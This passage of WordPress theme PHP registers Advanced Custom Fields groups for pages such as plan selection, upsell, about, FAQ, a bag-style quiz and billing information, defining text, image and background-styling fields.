                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fb93992e40e',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93992e40d',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93992e40c',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93992e40b',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939c2e41c',
                'label' => 'Gold',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb939c2e41b',
                'label' => 'Title',
                'name' => 'title_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939c2e41a',
                'label' => 'Content text',
                'name' => 'content_text_s1',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fb939c2e419',
                'label' => 'Image',
                'name' => 'image_s1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fb939b2e418',
                'label' => 'Platinum',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb939b2e417',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939b2e416',
                'label' => 'Content text',
                'name' => 'content_text_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fb939b2e415',
                'label' => 'Image',
                'name' => 'image_s2',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fb93992e40a',
                'label' => 'Message',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb93992e409',
                'label' => 'Content Text',
                'name' => 'content_text_s3',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_59fb93982e408',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fb93982e407',
                'label' => 'Background Color',
                'name' => 'background_color_s3',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fb93982e406',
                'label' => 'Background Image',
                'name' => 'background_image_s3',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fb93982e405',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s3',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93972e404',
                'label' => 'Background Position',
                'name' => 'background_position_s3',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93972e403',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s3',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb93972e402',
                'label' => 'Background Size',
                'name' => 'background_size_s3',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-select-your-plan.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_upsell',
        'title' => 'Upsell',
        'fields' => array (
            array (
                'key' => 'field_59fb93972e401',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb93972e400',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9ff6e6d',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb93962e3ff',
                'label' => 'Content Text',
                'name' => 'content_text_ph',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fb93962e3fe',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a009e8fb8669',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a009fa0f6e72',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a009fa0f6e71',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009fa0f6e70',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009fa0f6e6f',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9ff6e6e',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9ef6e6a',
                'label' => 'Content',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f9df6e69',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a009f9df6e68',
                'label' => 'Title',
                'name' => 'title',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9df6e67',
                'label' => 'Details',
                'name' => 'details',
                'type' => 'wysiwyg',
                'instructions' => '[tpc_line content="FOR JUST "][tpc_price] MONTHLY',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a009f9df6e65',
                'label' => 'text for the check box',
                'name' => 'text_checkbox',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9df6e66',
                'label' => 'Button text',
                'name' => 'button_text',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-upsell.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -2,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_about',
        'title' => 'About',
        'fields' => array (
            array (
                'key' => 'field_5a009f9cf6e62',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f9cf6e61',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9bf6e60',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9bf6e5e',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a009f9bf6e5d',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a009f9bf6e5c',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a009f9bf6e5b',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9af6e5a',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9af6e59',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9af6e58',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f9af6e57',
                'label' => 'Content',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f9af6e56',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a009f99f6e55',
                'label' => 'Title 1',
                'name' => 'title_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f99f6e54',
                'label' => 'content text 1',
                'name' => 'content_text_1',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a009f99f6e53',
                'label' => 'Title 2',
                'name' => 'title_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f99f6e51',
                'label' => 'content text 2',
                'name' => 'content_text_2',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a009f99f6e50',
                'label' => 'Link button',
                'name' => 'link_button',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f99f6e52',
                'label' => 'Button text',
                'name' => 'button_text',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-about-us.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_faq',
        'title' => 'FAQ',
        'fields' => array (
            array (
                'key' => 'field_5a009f98f6e4f',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f98f6e4e',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f98f6e4c',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f98f6e4b',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a009f98f6e4a',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a009f97f6e49',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a009f97f6e48',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f97f6e47',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f97f6e46',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f96f6e45',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f96f6e44',
                'label' => 'Content',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f96f6e43',
                'label' => 'Title',
                'name' => 'title',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f96f6e42',
                'label' => 'content text',
                'name' => 'content_text',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a009f96f6e41',
                'label' => 'Link button',
                'name' => 'link_button',
                'type' => 'page_link',
                'post_type' => array (
                    0 => 'page',
                ),
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a009f96f6e40',
                'label' => 'Button text',
                'name' => 'button_text',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-faq.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_faq-accordion',
        'title' => 'FAQ Accordion',
        'fields' => array (
            array (
                'key' => 'field_5a009f95f6e3f',
                'label' => 'content text',
                'name' => 'content_text',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'tpc_faq_accordion',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'permalink',
                1 => 'the_content',
                2 => 'custom_fields',
                3 => 'featured_image',
                4 => 'categories',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_quiz',
        'title' => 'Quiz',
        'fields' => array (
            array (
                'key' => 'field_5a08c2f8d5e20',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a08c305d5e4e',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c304d5e4d',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c2ffd5e30',
                'label' => 'Content Text',
                'name' => 'content_text_ph',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a08c304d5e4c',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a08c304d5e4b',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a08c304d5e4a',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c304d5e49',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a08c304d5e48',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a08c303d5e47',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a08c303d5e46',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a08c303d5e45',
                'label' => 'STEP 1',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a08c303d5e44',
                'label' => 'Title',
                'name' => 'title_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c303d5e43',
                'label' => 'Subtitle',
                'name' => 'subtitle_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c303d5e42',
                'label' => 'Text',
                'name' => 'text_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c301d5e39',
                'label' => 'Small',
                'name' => 'image_1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c301d5e38',
                'label' => 'Medium',
                'name' => 'image_2',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c300d5e37',
                'label' => 'Large',
                'name' => 'image_3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c300d5e36',
                'label' => 'X large',
                'name' => 'image_4',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c302d5e41',
                'label' => 'STEP 2',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a08c302d5e40',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c302d5e3f',
                'label' => 'Subtitle',
                'name' => 'subtitle_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c302d5e3e',
                'label' => 'Text',
                'name' => 'text_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c300d5e35',
                'label' => 'Crossbody',
                'name' => 'image_5',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c300d5e34',
                'label' => 'Tote',
                'name' => 'image_6',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c2ffd5e33',
                'label' => 'Clutche',
                'name' => 'image_7',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c2ffd5e32',
                'label' => 'Backpack',
                'name' => 'image_8',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c2ffd5e31',
                'label' => 'Hobo',
                'name' => 'image_9',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a08c302d5e3d',
                'label' => 'STEP 3',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a08c301d5e3c',
                'label' => 'Title',
                'name' => 'title_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c301d5e3b',
                'label' => 'Subtitle',
                'name' => 'subtitle_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a08c301d5e3a',
                'label' => 'Text',
                'name' => 'text_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-quiz.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_billing-information',
        'title' => 'Billing Information',
        'fields' => array (
            array (
                'key' => 'field_5a0ee82ac0b98',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a0eecee274cc',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eece2274cb',
